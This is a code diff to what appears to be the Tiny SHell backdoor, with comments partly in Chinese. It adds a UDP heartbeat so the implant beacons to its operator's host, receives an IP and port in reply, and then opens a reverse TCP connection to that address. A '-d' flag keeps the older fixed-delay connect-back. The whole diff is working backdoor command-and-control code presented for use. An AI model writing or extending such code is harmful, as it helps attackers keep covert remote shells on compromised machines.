@@ -41,6 +41,7 @@
 
 #include "tsh.h"
 #include "pel.h"
+#include "tshUdpProxy.h"
 
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
@@ -60,6 +61,45 @@ void usage(char *argv0)
     exit(1);
 }
 
+int hasWaitConnectSignal(int udpSock, struct sockaddr_in *outServer) {
+	struct sockaddr_in udpAddr;
+	static time_t lastHeartBeatTime;
+#define MAX_UDP_HEARTBEAT (1 * 60)
+
+	udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
+
+	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
+		struct tshProtocol data;
+		data.magic = MAGIC;
+		data.type = UPD_HEADBEAT;
+		data.length = sizeof(data);
+
+		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(udpAddr));
+		udpSendPacket(udpSock, &data, &udpAddr);
+		lastHeartBeatTime = time(NULL);
+	}
+	// 返回0表示有等待的连接请求
+
+	struct tshProtocol recvdata;
+
+	if (udpRecvPacket(udpSock, &recvdata, NULL) < 0) {
+		return -1;
+	}
+
+	info("udp recv from [%d.%d.%d.%d:%d]\n",
+		   __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
+		   __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
+		   __PORT(recvdata.listen_port));
+	memset((void *)outServer, '\0', (size_t)sizeof(struct sockaddr_in));
+	outServer->sin_family = AF_INET;
+	outServer->sin_addr.s_addr = recvdata.listen_ip;
+	outServer->sin_port = recvdata.listen_port;
+	if (outServer->sin_addr.s_addr == 0) {
+		outServer->sin_addr.s_addr = udpAddr.sin_addr.s_addr;
+	}
+
+	return 0;
+}
 
 /* program entry point */
 
@@ -76,8 +116,10 @@ int main( int argc, char **argv )
     struct hostent *client_host;
 	/* background as default. */
 	int background = 1;
+	/* use Udp proxy to got tcp ip:port, not tcp direct. */
+	int proxyUdp = 1;
 
-    while ((opt = getopt(argc, argv, "s:p:c:f")) != -1) {
+    while ((opt = getopt(argc, argv, "s:p:c:fd")) != -1) {
         switch (opt) {
             case 'p':
                 server_port=atoi(optarg); /* We hope ... */
@@ -89,6 +131,9 @@ int main( int argc, char **argv )
             case 'f':
                 background = 0;
                 break;
+			case 'd':
+				proxyUdp = 0;
+				break;
 			case 'c':
 				if (optarg == NULL) {
 					cb_host = CONNECT_BACK_HOST;
@@ -202,9 +247,25 @@ int main( int argc, char **argv )
 	} else {
 		/* -c specfieid, connect back mode */
 
+		int udpServer = socket(AF_INET, SOCK_DGRAM, 0);
+		struct timeval tv;
+		tv.tv_sec = 1 * 60;
+		tv.tv_usec = 0;
+		setsockopt(udpServer, SOL_SOCKET, SO_RCVTIMEO, (const void *)&tv, (socklen_t)sizeof(tv));
+
 	    while( 1 )
 	    {
-	        sleep( CONNECT_BACK_DELAY );
+			struct sockaddr_in sServer;
+			if (proxyUdp) {
+				/* 如果UDP发送过来了反向连接的ip:port */
+				if(hasWaitConnectSignal(udpServer, &sServer) != 0) {
+					// 如果没有反向连接数据.
+					continue;
+				}
+				printf("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
+			} else {
+				sleep( CONNECT_BACK_DELAY );
+			}
 
 	        /* create a socket */
 
@@ -231,6 +292,10 @@ int main( int argc, char **argv )
 	        client_addr.sin_family = AF_INET;
 	        client_addr.sin_port   = htons( server_port );
 
+			if (proxyUdp) {
+				/* 使用从UDP监听来的地址 */
+				client_addr = sServer;
+			}
 	        /* try to connect back to the client */
 
 	        ret = connect( client, (struct sockaddr *) &client_addr,
